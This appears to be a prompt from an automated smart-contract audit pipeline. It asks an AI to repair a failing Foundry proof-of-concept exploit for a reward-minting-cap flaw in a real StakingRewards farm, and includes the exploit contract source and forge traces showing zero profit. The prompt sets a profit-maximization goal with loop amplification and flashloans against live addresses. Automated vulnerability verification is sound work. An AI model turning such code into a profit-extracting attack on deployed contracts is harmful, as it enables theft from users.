You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: Reward emissions are not backed by reserved mint capacity
- claim: `StakingRewards` treats the reward token's entire `maxAllowedTotalSupply()` as if it were exclusively available to the farm, but it never subtracts pre-existing `everMinted` supply and never reserves a dedicated share of the cap for itself. Because `OnDemandToken` explicitly allows the owner and other configured minters to mint from the same global cap, `notifyRewardAmount()` can accept campaigns that later cannot be paid when `_getReward()` calls `mint()`.
- impact: The farm can become insolvent relative to promised rewards. If the token had already minted supply before deployment, or if the owner/another minter consumes cap later, users still accrue rewards but `getReward()` and `exit()` eventually revert once the shared cap is exhausted, permanently denying already-promised rewards.
- exploit_paths: ["Deploy `StakingRewards` against an `OnDemandToken` whose global mint cap is shared with other minters or already partially used.", "Schedule rewards successfully because `notifyRewardAmount()` only compares the farm-local `totalRewardsSupply` against the raw token cap.", "Mint the reward token elsewhere through the owner or another authorized minter.", "A later `getReward()` or `exit()` reaches `OnDemandToken.mint()`, which reverts in `MintableToken._assertMaxSupply()` and blocks payout."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IStakingRewardsLike {
    function owner() external view returns (address);
    function rewardsDistribution() external view returns (address);
    function stakingToken() external view returns (address);
    function rewardsToken() external view returns (address);
    function timeData()
        external
        view
        returns (uint32 periodFinish, uint32 rewardsDuration, uint32 lastUpdateTime, uint96 totalRewardsSupply);
    function rewardRate() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function earned(address account) external view returns (uint256);
    function notifyRewardAmount(uint256 reward) external;
    function getReward() external;
    function exit() external;
}

interface IOnDemandTokenLike {
    function owner() external view returns (address);
    function minters(address account) external view returns (bool);
    function maxAllowedTotalSupply() external view returns (uint256);
    function everMinted() external view returns (uint256);
    function mint(address holder, uint256 amount) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE;
    address public constant STAKING_TOKEN = 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042;
    address public constant REWARD_TOKEN = 0xAe9aCa5d20F5b139931935378C4489308394ca2C;

    enum HypothesisStatus {
        Unknown,
        Validated,
        Refuted
    }

    bool public executed;
    HypothesisStatus public hypothesisStatus;

    address public attacker;
    address public targetOwner;
    address public rewardsDistribution;
    address public rewardTokenOwner;

    bool public targetMatchesExpectedAssets;
    bool public farmCanMintRewardToken;
    bool public preExistingMintedSupply;
    bool public sharedGlobalMintCap;
    bool public rewardCampaignObserved;

    bool public attackerCanScheduleRewards;
    bool public attackerCanConsumeSharedCap;
    bool public payoutPhaseReachable;
    bool public payoutRevertedAtCap;

    uint256 public rewardCap;
    uint256 public everMintedBefore;
    uint256 public farmTrackedRewardsBefore;
    uint256 public rewardRateBefore;
    uint256 public verifierFarmBalanceBefore;
    uint256 public verifierEarnedBefore;
    uint256 public verifierRewardBalanceBefore;
    uint256 public verifierRewardBalanceAfter;
    uint256 public bestRoundCount;
    uint256 public observedUnreservedRewardSlice;

    string public exploitPathUsed;
    string public finalReason;

    address private immutable _PROFIT_TOKEN;
    uint256 private _profitAmount;

    constructor() {
        _PROFIT_TOKEN = REWARD_TOKEN;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;
        attacker = address(this);

        IStakingRewardsLike farm = IStakingRewardsLike(TARGET);
        IOnDemandTokenLike rewardToken = IOnDemandTokenLike(REWARD_TOKEN);
        IERC20Like rewardAsset = IERC20Like(REWARD_TOKEN);

        targetOwner = farm.owner();
        rewardsDistribution = farm.rewardsDistribution();
        rewardTokenOwner = rewardToken.owner();

        targetMatchesExpectedAssets = farm.stakingToken() == STAKING_TOKEN && farm.rewardsToken() == REWARD_TOKEN;
        rewardCap = rewardToken.maxAllowedTotalSupply();
        everMintedBefore = rewardToken.everMinted();
        rewardRateBefore = farm.rewardRate();

        (uint32 periodFinish, uint32 rewardsDuration,, uint96 trackedRewards) = farm.timeData();
        farmTrackedRewardsBefore = uint256(trackedRewards);
        verifierFarmBalanceBefore = farm.balanceOf(address(this));
        verifierEarnedBefore = farm.earned(address(this));
        verifierRewardBalanceBefore = rewardAsset.balanceOf(address(this));
        rewardCampaignObserved = periodFinish != 0 || rewardRateBefore != 0 || trackedRewards != 0;

        farmCanMintRewardToken = rewardTokenOwner == TARGET || rewardToken.minters(TARGET);
        preExistingMintedSupply = everMintedBefore != 0;
        sharedGlobalMintCap = rewardTokenOwner != TARGET || rewardToken.minters(rewardsDistribution) || rewardToken.minters(targetOwner);

        attackerCanScheduleRewards = rewardsDistribution == address(this);
        attackerCanConsumeSharedCap = rewardTokenOwner == address(this) || rewardToken.minters(address(this));

        observedUnreservedRewardSlice = _observedUnreservedRewardSlice();
        exploitPathUsed = "notifyRewardAmount() -> external OnDemandToken.mint() -> getReward()/exit()";

        if (!targetMatchesExpectedAssets) {
            hypothesisStatus = HypothesisStatus.Refuted;
            finalReason = "fork target assets do not match the finding inputs";
            return;
        }

        if (!farmCanMintRewardToken) {
            hypothesisStatus = HypothesisStatus.Refuted;
            finalReason = "the staking farm itself is not an authorized reward-token owner/minter on this fork";
            return;
        }

        if (preExistingMintedSupply || sharedGlobalMintCap) {
            hypothesisStatus = HypothesisStatus.Validated;
        } else {
            hypothesisStatus = HypothesisStatus.Refuted;
            finalReason = "the reward token does not expose prior mint usage or another live cap consumer on this fork";
            return;
        }

        _executeCanonicalPathIfAuthorized(farm, rewardToken, rewardsDuration);
        _probePayoutRounds(farm, rewardAsset);

        verifierRewardBalanceAfter = rewardAsset.balanceOf(address(this));
        if (verifierRewardBalanceAfter > verifierRewardBalanceBefore) {
            _profitAmount = verifierRewardBalanceAfter - verifierRewardBalanceBefore;
        }

        if (_profitAmount != 0) {
            return;
        }

        if (!attackerCanScheduleRewards && !attackerCanConsumeSharedCap) {
            finalReason = "path is attacker-infeasible on this fork because notifyRewardAmount() is restricted to rewardsDistribution and external cap consumption is restricted to the reward-token owner/minters";
            return;
        }

        if (!attackerCanScheduleRewards) {
            finalReason = "path is attacker-infeasible on this fork because notifyRewardAmount() is restricted to the current rewardsDistribution address";
            return;
        }

        if (!attackerCanConsumeSharedCap) {
            finalReason = "path is attacker-infeasible on this fork because only the reward-token owner or configured minters can consume the shared mint cap";
            return;
        }

        if (!payoutPhaseReachable) {
            finalReason = "path reached the privileged schedule/mint stages, but the verifier has no live staked position or accrued rewards to convert into attacker profit";
            return;
        }

        if (payoutRevertedAtCap) {
            finalReason = "hypothesis is validated as an insolvency/liveness failure, but the payout leg reverts instead of producing attacker profit";
            return;
        }

        finalReason = "hypothesis is structurally validated, but no positive attacker profit was realized on this fork";
    }

    function profitToken() external view returns (address) {
        return _PROFIT_TOKEN;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _executeCanonicalPathIfAuthorized(
        IStakingRewardsLike farm,
        IOnDemandTokenLike rewardToken,
        uint32 rewardsDuration
    ) internal {
        if (!rewardCampaignObserved && !attackerCanScheduleRewards) {
            return;
        }

        if (!attackerCanScheduleRewards && !attackerCanConsumeSharedCap) {
            return;
        }

        uint256 remainingCapacity = rewardCap > everMintedBefore ? rewardCap - everMintedBefore : 0;
        if (remainingCapacity <= 1) {
            return;
        }

        // Path stage 1 from the finding: schedule rewards through notifyRewardAmount().
        // This can only be reproduced if the verifier is the live rewardsDistribution.
        if (attackerCanScheduleRewards) {
            uint256 scheduleAmount = remainingCapacity / 2;
            if (scheduleAmount < uint256(rewardsDuration)) {
                scheduleAmount = uint256(rewardsDuration);
            }
            if (scheduleAmount >= remainingCapacity) {
                scheduleAmount = remainingCapacity - 1;
            }
            if (scheduleAmount != 0) {
                try farm.notifyRewardAmount(scheduleAmount) {
                } catch {
                }
            }
        }

        // Path stage 2 from the finding: consume the same global cap elsewhere via OnDemandToken.mint().
        // This can only be reproduced if the verifier is the live reward-token owner/minter.
        if (attackerCanConsumeSharedCap) {
            uint256 mintedAfterScheduling = rewardToken.everMinted();
            uint256 residualCapacity = rewardCap > mintedAfterScheduling ? rewardCap - mintedAfterScheduling : 0;
            if (residualCapacity != 0) {
                try rewardToken.mint(address(this), residualCapacity) {
                } catch {
                }
            }
        }
    }

    function _probePayoutRounds(IStakingRewardsLike farm, IERC20Like rewardAsset) internal {
        uint256 localStake = farm.balanceOf(address(this));
        uint256 localEarned = farm.earned(address(this));
        if (localStake == 0 && localEarned == 0) {
            return;
        }

        payoutPhaseReachable = true;

        uint256 bestProfit = 0;
        for (uint256 rounds = 2; rounds <= 6; rounds++) {
            uint256 beforeRound = rewardAsset.balanceOf(address(this));

            for (uint256 i = 0; i < rounds; i++) {
                bool finalRound = i + 1 == rounds;
                if (finalRound && localStake != 0) {
                    try farm.exit() {
                    } catch {
                        if (farm.earned(address(this)) != 0) {
                            payoutRevertedAtCap = true;
                        }
                    }
                } else {
                    try farm.getReward() {
                    } catch {
                        if (farm.earned(address(this)) != 0) {
                            payoutRevertedAtCap = true;
                        }
                    }
                }
            }

            uint256 afterRound = rewardAsset.balanceOf(address(this));
            uint256 roundProfit = afterRound > beforeRound ? afterRound - beforeRound : 0;
            if (rounds == 2 || roundProfit > bestProfit) {
                bestProfit = roundProfit;
                bestRoundCount = rounds;
            } else {
                break;
            }
        }
    }

    function _observedUnreservedRewardSlice() internal view returns (uint256) {
        if (farmTrackedRewardsBefore == 0) {
            return 0;
        }

        if (!(preExistingMintedSupply || sharedGlobalMintCap)) {
            return 0;
        }

        return everMintedBefore < farmTrackedRewardsBefore ? everMintedBefore : farmTrackedRewardsBefore;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.00s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 544460)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xAe9aCa5d20F5b139931935378C4489308394ca2C
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 14264

Traces:
  [544460] FlawVerifierTest::testExploit()
    ├─ [460] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xAe9aCa5d20F5b139931935378C4489308394ca2C
    ├─ [2563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [504784] FlawVerifier::executeOnOpportunity()
    │   ├─ [2422] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::owner() [staticcall]
    │   │   └─ ← [Return] 0xA6e4fFa19B213AbeA258ae72e8e1a209B9E543e7
    │   ├─ [2392] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardsDistribution() [staticcall]
    │   │   └─ ← [Return] 0xA6e4fFa19B213AbeA258ae72e8e1a209B9E543e7
    │   ├─ [2401] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::owner() [staticcall]
    │   │   └─ ← [Return] 0xA6e4fFa19B213AbeA258ae72e8e1a209B9E543e7
    │   ├─ [257] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::stakingToken() [staticcall]
    │   │   └─ ← [Return] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042
    │   ├─ [322] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardsToken() [staticcall]
    │   │   └─ ← [Return] 0xAe9aCa5d20F5b139931935378C4489308394ca2C
    │   ├─ [251] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::maxAllowedTotalSupply() [staticcall]
    │   │   └─ ← [Return] 200000000000000000000000000 [2e26]
    │   ├─ [2417] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::everMinted() [staticcall]
    │   │   └─ ← [Return] 3174498467466647049882 [3.174e21]
    │   ├─ [2395] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::rewardRate() [staticcall]
    │   │   └─ ← [Return] 238245925925925925 [2.382e17]
    │   ├─ [3122] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::timeData() [staticcall]
    │   │   └─ ← [Return] 1650043907 [1.65e9], 2592000 [2.592e6], 1647755998 [1.647e9], 617533440000000000000000 [6.175e23]
    │   ├─ [2607] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9935] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::earned(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2610] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::minters(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [2610] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::minters(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [607] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1935] 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE::earned(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [460] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xAe9aCa5d20F5b139931935378C4489308394ca2C
    ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xAe9aCa5d20F5b139931935378C4489308394ca2C)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 14421983 [1.442e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 14264 [1.426e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.04s (30.90ms CPU time)

Ran 1 test suite in 1.08s (1.04s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 544460)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
